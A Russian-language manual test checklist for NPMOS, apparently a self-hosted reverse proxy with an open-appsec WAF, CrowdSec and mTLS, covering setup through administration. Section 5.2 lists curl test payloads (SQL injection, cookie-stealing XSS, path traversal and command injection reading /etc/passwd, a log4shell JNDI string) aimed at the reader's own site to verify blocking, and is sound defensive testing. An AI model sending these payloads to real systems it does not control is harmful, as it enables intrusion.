# Полная проверка NPMOS: чеклист

Пошаговая проверка всей системы руками, сверху вниз по меню интерфейса. У каждого пункта — **как** проверить и **что** должно получиться. Пункты идут в том порядке, в котором их удобно делать: каждый следующий опирается на предыдущие (сначала сертификат, потом хост с этим сертификатом, потом WAF на этом хосте и т.д.).

Что проверяет CI сам, перечислено в `docs/TESTING-DEVELOP.md` (п. 9), там же — как развернуть стек. Если пункт не прошёл: «Обзор → Сервисы → Диагностика» скачивает архив с логами без секретов — приложите его к issue.

Обозначения: `<IP>` — адрес сервера, `site.example.com` — ваш домен, A-запись которого указывает на `<IP>`. Без домена используйте подмену заголовка: `curl -H 'Host: test.local' http://<IP>/`.

## 0. Подготовка

- [ ] **Стек поднят.** Как: `docker compose -f deploy/compose.yaml up -d`, затем `docker compose -f deploy/compose.yaml ps`. Результат: `npmos` и `postgres` в состоянии `healthy`, остальные `running`; `npmos-init` завершился с кодом 0.
- [ ] **Тестовый сайт.** Как: `docker run -d --name test-upstream --network npmos_internal traefik/whoami`. Результат: контейнер работает; он отвечает заголовками запроса, поэтому видно, какой IP и заголовки дошли до upstream.
- [ ] **Порты открыты снаружи.** Как: с другой машины `curl -kI https://<IP>:81` и `curl -I http://<IP>`. Результат: на `:81` отвечает интерфейс (200), на `:80` — страница по умолчанию.

## 1. Первый вход и интерфейс

- [ ] **Создание администратора.** Как: `https://<IP>:81` → форма первого запуска. Результат: после ввода email и пароля открывается «Обзор». Сертификат на `:81` самоподписанный — предупреждение браузера ожидаемо.
- [ ] **Вход и выход.** Как: выйти через меню пользователя (вверху слева), войти снова. Результат: вход по email/паролю, после выхода — снова форма входа; в консоли браузера нет ошибок, кроме `401` на `/api/tokens` до входа.
- [ ] **2FA.** Как: меню пользователя → двухфакторная аутентификация, отсканировать QR, выйти и войти. Результат: после пароля спрашивается 6-значный код; неверный код — ошибка, верный — вход.
- [ ] **Язык и тема.** Как: кнопки RU/EN и солнце/луна внизу боковой панели. Результат: весь текст меняет язык без перезагрузки (нигде не остаётся английских строк в RU), тёмная тема без «белых пятен» на всех страницах.
- [ ] **Узкий экран.** Как: окно шириной ~400 px или телефон. Результат: меню прячется в выезжающую слева панель, таблицы прокручиваются внутри карточек, страница не скроллится по горизонтали.
- [ ] **Нет ошибок DOM в консоли.** Как: открыть DevTools → Console и пройти «Настройки» (все группы), «Уведомления → Новый канал», «Перенос», «PKI → Добавить CA». Результат: нет предупреждений `[DOM] Input elements should have autocomplete attributes` и `Password field is not contained in a form`.

## 2. Обзор → Обзор и Сервисы

- [ ] **Состояние системы.** Как: «Обзор». Результат: карточки хостов, сертификатов, WAF и CrowdSec с живыми цифрами; предупреждения (например, истекающий сертификат) видны вверху с кнопкой «Показать».
- [ ] **Сервисы.** Как: «Обзор → Сервисы». Результат: список всех контейнеров стека со статусом; у каждого — «Логи» (последние строки, обновляются), у `postgres`/`crowdsec`/`appsec-*` — «Перезапустить». `socket-proxy` и `npmos-control` перезапустить нельзя (кнопки нет).
- [ ] **Перезапуск postgres.** Как: «Перезапустить» у `postgres`. Результат: через 5–15 с сервис снова `healthy`, интерфейс продолжает работать без повторного входа.
- [ ] **Диагностика.** Как: «Диагностика». Результат: скачивается `.tar.gz` с логами и состоянием всех сервисов; внутри нет паролей и ключей (`grep -ri password` по архиву пуст).

## 3. Сертификаты

- [ ] **Let's Encrypt (HTTP-01).** Как: «Сертификаты → Все сертификаты → Добавить → Let's Encrypt», домен `site.example.com`, email. Нужно: A-запись на `<IP>`, порт 80 открыт снаружи. Результат: через 10–60 с сертификат в списке с издателем Let's Encrypt и сроком ~90 дней. Без интернета — понятная ошибка по таймауту, а не зависание.
- [ ] **Let's Encrypt (DNS-01).** Как: то же, «Использовать DNS-проверку», провайдер и токен API. Результат: выпускается и wildcard (`*.example.com`).
- [ ] **Свой ACME-сервер.** Как: «Администрирование → Настройки → ACME (Let's Encrypt и другие)», адрес директории своего ACME (например step-ca), затем выпуск как выше. Результат: сертификат выпущен вашим CA.
- [ ] **Загрузка своего сертификата.** Как: «Добавить → Свой сертификат», файлы `.crt`/`.key` (и цепочка). Результат: сертификат в списке с правильным CN и сроком; с ключом от другого сертификата — ошибка «ключ не подходит».
- [ ] **Продление и истечение.** Как: фильтр «Истекают» в списке. Результат: сертификаты Let's Encrypt моложе 30 дней до конца продлеваются сами (раз в сутки); свои — помечены предупреждением за 14 дней на «Хостах» и «Обзоре».

## 4. Хосты

### 4.1. Прокси-хост сайта

- [ ] **Создание.** Как: «Хосты → Добавить → Прокси». Вкладка «Сведения»: домен `site.example.com`, схема `http`, адрес `test-upstream`, порт `80`. Вкладка «TLS»: сертификат из п. 3, «Всегда HTTPS», «HTTP/3». Сохранить. Результат: строка в таблице с зелёной точкой (upstream отвечает), в колонке TLS — издатель и срок.
- [ ] **Сайт открывается.** Как: `https://site.example.com` в браузере. Результат: страница whoami; в ней `X-Real-Ip` / `X-Forwarded-For` — **ваш** внешний IP, а не адрес Docker-шлюза; `http://` перенаправляет на `https://`.
- [ ] **HTTP/3.** Как: DevTools → Network → колонка Protocol, обновить страницу 2–3 раза. Результат: `h3` (нужен открытый UDP 443).
- [ ] **Свои маршруты (locations).** Как: вкладка «Свои маршруты» → `/api` на другой upstream. Результат: `https://site.example.com/api/...` уходит на второй upstream, остальное — на первый.
- [ ] **Выключение и удаление.** Как: переключатель «Статус» в строке, затем «⋯ → Удалить». Результат: выключенный хост не отвечает (страница по умолчанию), удалённый пропадает из таблицы и из «Журнала аудита» видно, кто это сделал.
- [ ] **Дублирование и история.** Как: «⋯ → Дублировать», «⋯ → История». Результат: копия с теми же настройками без доменов; история показывает изменения полей с автором и временем.

### 4.2. Панель NPMOS за своим доменом

Частый сценарий: открыть интерфейс по `https://npmos.example.com` вместо `https://<IP>:81`.

- [ ] **Как:** прокси-хост `npmos.example.com` → схема **`https`**, адрес `127.0.0.1`, порт `81`, свой сертификат во вкладке TLS. Результат: интерфейс открывается по домену, вход работает.
- [ ] **Схема `http` к порту 81 не работает:** интерфейс на `:81` сам перенаправляет HTTP на HTTPS, и браузер получает `ERR_TOO_MANY_REDIRECTS`. Схема должна быть `https`.
- [ ] **С WAF на этом хосте** (Prevent-Learn): интерфейс загружается полностью, со стилями. Если вместо интерфейса белый экран и в консоли `Refused to apply style ... MIME type ('text/html')` — агент блокирует CSS-запросы Chrome (заголовок `Sec-Fetch-Dest: style`); это исправлено в образе `npmos-appsec-agent` (файл `deploy/openappsec/agent/waap-headers.json`), обновите образ агента.

### 4.3. Редирект, поток, 404

- [ ] **Редирект.** Как: «Добавить → Редирект», `old.example.com` → `https://site.example.com`, код 301, «Сохранять путь». Результат: `curl -I http://old.example.com/a?b=1` → `301`, `Location: https://site.example.com/a?b=1`.
- [ ] **Поток (TCP/UDP).** Как: «Добавить → Поток», входящий порт `2222` → `test-upstream:80`, TCP. Порт должен быть проброшен в compose. Результат: `curl http://<IP>:2222/` отвечает whoami.
- [ ] **404-хост.** Как: «Добавить → 404», домен `dead.example.com`. Результат: любой запрос к нему — `404`.
- [ ] **Страница по умолчанию.** Как: «Администрирование → Настройки → Страница по умолчанию» → «Нет ответа (444)». Результат: `curl http://<IP>/` с неизвестным Host обрывает соединение.

### 4.4. Списки доступа

- [ ] **Basic Auth.** Как: «Хосты → Списки доступа → Добавить», пользователь/пароль, назначить хосту в «Сведения → Глобальные списки доступа». Результат: браузер спрашивает логин; с верным — сайт, без — `401`.
- [ ] **По IP.** Как: в списке «Разрешить» только свой IP, «Запретить all». Результат: с вашего IP — сайт, с другого (мобильный интернет) — `403` со страницей блокировки NPMOS.

### 4.5. Фильтры, вид, экспорт

- [ ] Как: поиск по домену/порту, «Фильтры» (тип, WAF, TLS, «истекает»), «Вид» (колонки), «Экспорт». Результат: фильтры сохраняются в адресе страницы (ссылкой можно поделиться), экспорт скачивает CSV/JSON текущей выборки.

## 5. WAF open-appsec

### 5.1. Включение

- [ ] **WAF включён по умолчанию.** Как: «Агенты → open-appsec → Агент». Результат: переключатель «Включён»; карточка «Агент» — «Управление: локально, без облака», время «Политика применена», «Последнее обновление» — `Succeeded` (не «Failed… Failed to load Orchestration new policy file» после смены политики). Если выключен: переключить → подтвердить; через ~30 с npmos перезапустится, страница сама обновит состояние (без `ERR_CONNECTION_RESET` в консоли).
- [ ] **Защита хоста.** Как: окно хоста → вкладка «WAF» → «Защищать с помощью open-appsec», режим **Detect-Learn**, минимальная уверенность **High**. Результат: в таблице хостов колонка WAF — «Обнаружение».

### 5.2. Атаки

Запросы с другой машины (подставьте свой домен или `-H 'Host: …'`):

```bash
T=https://site.example.com
curl -s -o /dev/null -w '%{http_code}  норма\n'     "$T/?q=hello"
curl -s -o /dev/null -w '%{http_code}  SQLi\n'      "$T/?id=1%27%20OR%20%271%27=%271"
curl -s -o /dev/null -w '%{http_code}  XSS\n'       "$T/?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E"
curl -s -o /dev/null -w '%{http_code}  traversal\n' "$T/?file=../../../../etc/passwd"
curl -s -o /dev/null -w '%{http_code}  RCE\n'       "$T/?cmd=;cat%20/etc/passwd"
curl -s -o /dev/null -w '%{http_code}  log4shell\n' -H 'User-Agent: ${jndi:ldap://x.example/a}' "$T/"
```

- [ ] **Detect-Learn.** Результат: все `200`; через 5–30 с атаки видны в «Аналитика → События» как Detect, с вашим IP, типом атаки, параметром и индикаторами.
- [ ] **Prevent-Learn.** Как: переключить хост в Prevent-Learn, подождать до 30 с, повторить. Результат: атаки — `403` со страницей блокировки NPMOS, норма — `200`; в «Событиях» — Prevent.
- [ ] **Обычный браузер не блокируется.** Как: в Prevent-Learn походить по сайту в Chrome (страницы, стили, картинки, формы). Результат: ни одного `403` у нормальных запросов (DevTools → Network, фильтр `status-code:403`). Запросы CSS с `Sec-Fetch-Dest: style` проходят.
- [ ] **Locations с другим режимом.** Как: «Свои маршруты» → `/api`, вкладка WAF маршрута → «Выключено». Результат: атака на `/api/?q=<script>` — `200`, на `/?q=<script>` — `403`.

### 5.3. Политика

- [ ] **Шаблоны.** Как: «Агенты → open-appsec → Политики», у хоста выбрать «Строгий». Результат: срабатывают и атаки средней уверенности; ответ — страница блокировки. Вернуть «Рекомендуемый».
- [ ] **Исключение из события.** Как: «Аналитика → События» → заблокированная атака → «Создать исключение», оставить условие «IP источника», применить. Результат: атака с вашего IP проходит (`200`); «Политики → Версии» → откат на предыдущую — снова `403`.
- [ ] **Ограничение частоты.** Как: объект «Ограничение частоты» (`/login`, 3 в минуту, «Блокировать») → хосту в «Свои объекты». Результат: 4-й и следующие запросы к `/login` за минуту — `403`.
- [ ] **Экспорт/импорт и эксперт.** Как: «Экспорт» политики в YAML, «Импорт» обратно; «Эксперт» — фрагмент YAML → «Проверить». Результат: импорт показывает план без ошибок; ошибка YAML — с номером строки; «Показать YAML» на вкладке «Агент» показывает итоговую политику.

### 5.4. Обучение

- [ ] **Очередь разметки.** Как: «Агенты → open-appsec → Обучение». Результат: события сгруппированы по хосту, URL, параметру и индикаторам; у группы — причина (Заблокировано / Серая зона / Обнаружено), число событий и источников, оценка. Поиск не наезжает на фильтры периода.
- [ ] **Пометить «Легитимно».** Как: у ложного срабатывания «Легитимно» → область (значение/параметр/URL), «Сразу исключение». Результат: группа уходит из очереди в «Историю»; такой запрос больше не блокируется (сразу — через исключение); «Отменить» в истории возвращает как было.
- [ ] **Пометить «Атака».** Как: «Атака» → «Забанить источники в CrowdSec». Результат: IP источников в «CrowdSec → Решения».
- [ ] **Готовность модели.** Как: блок готовности хоста на вкладке. Результат: уровень растёт при обычном трафике от многих источников (часы—сутки); рекомендация «Переключить в Prevent» появляется, когда модель уверена.

### 5.5. Агент

- [ ] **Fail-open.** Как: «Агент → Настройки агента» → fail-open вкл., сохранить, затем `docker stop npmos-appsec-agent`. Результат: защищённый сайт открывается (без проверки). С fail-open выкл. — запросы к защищённому хосту отклоняются, к незащищённому — проходят. Потом `docker start npmos-appsec-agent`.
- [ ] **Страница блокировки.** Как: «Агенты → Страница блокировки», поменять текст/цвет, сохранить. Результат: заблокированный запрос показывает новую страницу с IP, временем и ID запроса; интерфейс `:81` её не использует.

## 6. CrowdSec

- [ ] **Обзор.** Как: «Агенты → CrowdSec → Обзор». Результат: LAPI доступен, машина NPMOS и баунсер зарегистрированы, метрики разборщиков растут при трафике.
- [ ] **Баунсер NPMOS.** Как: «Политика» → «Баунсер NPMOS» вкл. Результат: в таблице хостов колонка CrowdSec — «Баунсер вкл.».
- [ ] **Ручной бан.** Как: «Решения → Забанить» свой IP на 10 минут. Результат: сайты за прокси — `403`, интерфейс `:81` остаётся доступен; «Разбанить» — сайты снова открываются.
- [ ] **Сценарии.** Как: с тестовой машины `for i in $(seq 1 30); do curl -s -o /dev/null https://site.example.com/wp-login.php; done`. Результат: в «Алертах» срабатывает сценарий сканирования, в «Решениях» — бан этого IP.
- [ ] **AppSec CrowdSec.** Как: `curl -I https://site.example.com/.env`. Результат: `403`, событие в «Аналитика → События» с источником CrowdSec. В хосте «Отключить CrowdSec AppSec» → запрос проходит до upstream.
- [ ] **Связка с WAF.** Как: 5 атак, заблокированных open-appsec, с одного IP за 10 минут. Результат: IP забанен в CrowdSec на 4 часа.
- [ ] **Блок-листы.** Как: «Блок-листы → Добавить» из файла (список IP) или по URL. Результат: адреса из списка получают `403`.
- [ ] **Hub без интернета.** Как: «Hub» → загрузить офлайн-снимок (`scripts/crowdsec-hub-snapshot.sh`), установить коллекцию. Результат: коллекция установлена, CrowdSec перезапущен; без снимка — понятное сообщение, каких файлов не хватает.
- [ ] **Блокировки.** Как: «Аналитика → Блокировки». Результат: все действующие баны с источником (вручную, сценарий, WAF, блок-лист) и сроком.

## 7. Сертификаты → PKI и mTLS

Три способа отзыва, все через GUI. Что выбрать: для людей — OCSP (мгновенно и без перезагрузки nginx) или короткоживущие сертификаты со ссылкой; для сервисов — короткоживущие с токеном; CRL — если хост должен работать, даже когда NPMOS перезапускается.

- [ ] **CA.** Как: «Сертификаты → PKI и mTLS → Добавить CA» (корень), затем «Домен доверия» под ним. Результат: CA в списке, CRL опубликован (ссылка открывается).
- [ ] **Клиентский сертификат.** Как: «Выпустить → Клиентский», свой пароль `.p12` (или пусто — сгенерируется), скачать `.p12` или одноразовую ссылку/QR. Результат: ссылка открывается один раз (второй раз — 410); `.p12` открывается заданным паролем и импортируется в Chrome/Firefox/Android/iOS.
- [ ] **mTLS на хосте.** Как: «Сертификаты → mTLS» или колонка mTLS у хоста → включить с доменом доверия. Результат: без сертификата — страница «Нужен клиентский сертификат» в стиле NPMOS (светлая/тёмная, RU/EN), с сертификатом — сайт; upstream получает заголовки `X-Client-*`.
- [ ] **Отзыв по CRL (режим «CRL»).** Как: в настройках mTLS хоста «Проверка отзыва: CRL», зайти с сертификатом, отозвать его, обновить страницу в том же браузере. Результат: отказ за секунды, **и в уже открытой вкладке тоже** (сессии TLS для mTLS-хостов не возобновляются). nginx мягко перечитывает конфигурацию: открытые соединения не рвутся.
- [ ] **Отзыв по OCSP (режим «OCSP», без перезагрузки nginx).** Как: «Проверка отзыва: OCSP», зайти с сертификатом, отозвать. На сервере до и после: `docker exec npmos sh -c 'cat /usr/local/nginx/logs/nginx.pid; ps -o pid,args | grep "nginx: worker"'`. Результат: отказ в течение минуты, PID мастера и воркеров nginx не изменились. Режим недоступен для потоков и для внешних CA.
- [ ] **Отдельный CA на человека.** Как: хост доверяет **корню**, режим OCSP; «Выпустить сертификат доступа» → «Отдельный CA для этого человека». Затем удалить CA `user: <имя>` («PKI и mTLS → CA → Удалить»). Результат: под корнем появляется CA человека, с его сертификатом сайт открывается; после удаления CA — отказ в течение минуты без перезагрузки nginx.
- [ ] **Короткоживущий для человека («Люди: ссылка»).** Как: «Выпустить → Клиентский → Автоматический перевыпуск: Люди: ссылка», срок 2 часа, свой пароль; правило уведомлений «Сертификат перевыпущен автоматически» с каналом Telegram/почта. Результат: примерно за 40 минут до конца приходит сообщение со ссылкой на новый `.p12`, он открывается **тем же паролем**; старый работает до своего конца. «Сертификат истекает» по таким сертификатам не приходит.
- [ ] **Короткоживущий для сервиса («Сервисы: токен», как в Istio).** Как: «Выпустить → Клиентский → Сервисы: токен», срок 1 час; скопировать токен и команду из окна результата, выполнить её. Результат: ответ JSON с `cert_pem`, `key_pem` и новым `renew_token`; старый сертификат отозван; повтор со старым токеном — `401`. С `csr_pem` в теле сервис оставляет свой ключ; CSR с другим CN — `400`.
- [ ] **Удаление CA с доменами и хостами.** Как: «CA → Удалить» у корня, у которого есть домены доверия и хосты с mTLS. Результат: в окне видно, что удалится (домены, число сертификатов) и какие хосты затронуты; кнопка «Отключить mTLS на хостах и удалить» удаляет всё одним действием, на хостах, доверявших только этим CA, mTLS выключается.
- [ ] **Серверный сертификат.** Как: «Выпустить → Серверный → Установить как сертификат NPMplus», импортировать корень в доверенные на своей машине. Результат: внутренний сайт открывается без предупреждения браузера.

## 8. Аналитика

- [ ] **Аналитика.** Как: «Аналитика → Аналитика», периоды 1 ч / 24 ч / 7 дн / 30 дн. Результат: запросы, блокировки, топ хостов/IP/стран/атак. Число запросов = строки access-лога прокси-хостов. Не считаются: интерфейс `:81` (в том числе когда панель открыта через прокси-хост — раньше такие запросы считались дважды), прокси-хосты, ведущие на саму панель (`127.0.0.1:81`, её опрос API), проверки здоровья. У публичного сайта много запросов от ботов — это нормально. «Заблокировано» растёт только у хостов в Prevent.
- [ ] **События.** Как: «Аналитика → События», фильтры (хост, действие, тип, период), карточка события, экспорт. Результат: серверная пагинация, фильтры в адресе страницы, в карточке — исходный JSON агента; экспорт скачивает выборку.
- [ ] **Журнал аудита.** Как: «Аналитика → Журнал аудита», фильтр по пользователю и действию. Результат: каждое изменение (хост, сертификат, политика, роль, бан) с автором, временем и объектом.

## 9. Администрирование

- [ ] **Пользователи и роли.** Как: «Роли → Добавить» (например «Аналитик»: только просмотр событий и аналитики), «Пользователи → Добавить» с этой ролью; войти под ним в другом окне. Результат: в меню только разрешённые разделы, кнопок изменения нет, прямой URL запрещённой страницы показывает «Нет доступа», API отвечает `403`.
- [ ] **Роль на конкретные хосты.** Как: в роли ограничить хосты одним доменом. Результат: пользователь видит и правит только этот хост.
- [ ] **Уведомления.** Как: «Уведомления → Новый канал» (Telegram: токен бота и chat id; email: SMTP; webhook), «Проверить», затем правило (например «Блокировка WAF» или «Срок сертификата»). Результат: тестовое сообщение приходит; при событии — уведомление с деталями; webhook подписан HMAC.
- [ ] **Настройки.** Как: «Настройки», группы «Общие», «Сеть», «TLS», «Nginx», «Журналы», «ACME», «Внешние сервисы», «GeoIP». Результат: изменения сохраняются; где нужен перезапуск — это сказано и перезапуск делается кнопкой; секреты показываются как `********`.
- [ ] **GeoIP.** Как: «Настройки → GeoIP» → загрузить `.mmdb`. Результат: в событиях и аналитике появляется страна источника.
- [ ] **Перенос с NPM/NPMplus.** Как: «Настройки → Перенос» → архив `/data` старой установки или подключение к её БД, «Проверить», «Перенести». Результат: хосты, сертификаты, списки доступа и пользователи появились; подробности — `docs/MIGRATION.md`.

## 10. Надёжность и закрытый контур

- [ ] **Перезагрузка сервера.** Как: `sudo reboot`. Результат: стек поднимается сам, WAF включён, политика применена, сайты открываются.
- [ ] **Без интернета.** Как: запретить исходящий трафик сервера в firewall и перезапустить стек. Результат: всё работает, кроме выпуска Let's Encrypt и онлайн-hub CrowdSec; запуск не ждёт внешних сервисов. Автоматически то же проверяет `scripts/test-airgap.sh`.
- [ ] **Обновление.** Как: `git pull && docker compose -f deploy/compose.yaml pull && docker compose -f deploy/compose.yaml up -d`. Результат: данные, пользователи, хосты, обучение агента на месте; миграции применились при старте (`docker compose logs npmos | grep -i migrat`).
- [ ] **Сессия переживает перезапуск.** Как: «Сервисы → npmos → Перезапустить» (или включение/выключение WAF). Результат: после перезапуска интерфейс продолжает работать без повторного входа.
